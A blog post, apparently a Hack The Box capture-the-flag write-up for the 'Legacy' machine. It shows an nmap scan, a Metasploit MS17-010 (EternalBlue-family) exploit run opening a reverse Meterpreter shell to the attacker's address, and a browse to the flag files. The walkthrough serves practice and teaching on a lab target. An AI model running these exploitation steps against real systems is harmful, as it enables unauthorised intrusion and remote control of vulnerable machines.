---
layout: post
title: Legacy Writeup
permalink: /wafflesec/#posts/legacy-writeup/
description: Legacy Writeup for HTB
---

Nmap Scan

Nmap Command
```
sudo nmap -sC -sV --max-retries 2500 [IP]
```

Nmap Output 
```
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h02m33s, deviation: 1h24m50s, median: 5d00h02m33s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:bb:55 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-11-13T09:09:06+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

Metasploit

```
maria@wafffl3:~/Desktop/HTB/Machines/Legacy$ msfconsole
msf6 > search eternal blue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.39.61
RHOSTS => 10.129.39.61
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] 10.129.39.61:445 - Target OS: Windows 5.1
[*] 10.129.39.61:445 - Filling barrel with fish... done
[*] 10.129.39.61:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.129.39.61:445 - 	[*] Preparing dynamite...
[*] 10.129.39.61:445 - 		[*] Trying stick 1 (x86)...Boom!
[*] 10.129.39.61:445 - 	[+] Successfully Leaked Transaction!
[*] 10.129.39.61:445 - 	[+] Successfully caught Fish-in-a-barrel
[*] 10.129.39.61:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.129.39.61:445 - Reading from CONNECTION struct at: 0x8229fa28
[*] 10.129.39.61:445 - Built a write-what-where primitive...
[+] 10.129.39.61:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.39.61:445 - Selecting native target
[*] 10.129.39.61:445 - Uploading payload... iKSkgBUS.exe
[*] 10.129.39.61:445 - Created \iKSkgBUS.exe...
[+] 10.129.39.61:445 - Service started successfully...
[*] 10.129.39.61:445 - Deleting \iKSkgBUS.exe...
[*] Sending stage (175174 bytes) to 10.129.39.61
[*] Meterpreter session 1 opened (10.10.14.93:4444 -> 10.129.39.61:1047) at 2020-11-08 18:40:06 +0000

meterpreter > shell
Process 188 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>cd ../../
cd ../../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  07:30 ��                 0 AUTOEXEC.BAT
16/03/2017  07:30 ��                 0 CONFIG.SYS
16/03/2017  08:07 ��    <DIR>          Documents and Settings
29/12/2017  10:41 ��    <DIR>          Program Files
13/11/2020  10:39 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.297.419.776 bytes free

C:\>cd Documents and Settings
cd Documents and Settings

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:07 ��    <DIR>          Administrator
16/03/2017  07:29 ��    <DIR>          All Users
16/03/2017  07:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.297.415.680 bytes free

C:\Documents and Settings>cd john/Desktop
cd john/Desktop

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��    <DIR>          .
16/03/2017  08:19 ��    <DIR>          ..
16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.415.680 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt

C:\Documents and Settings\john\Desktop>cd ../../
cd ../../

C:\Documents and Settings>cd Administrator/Desktop
cd Administrator/Desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  08:18 ��    <DIR>          .
16/03/2017  08:18 ��    <DIR>          ..
16/03/2017  08:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.407.488 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
```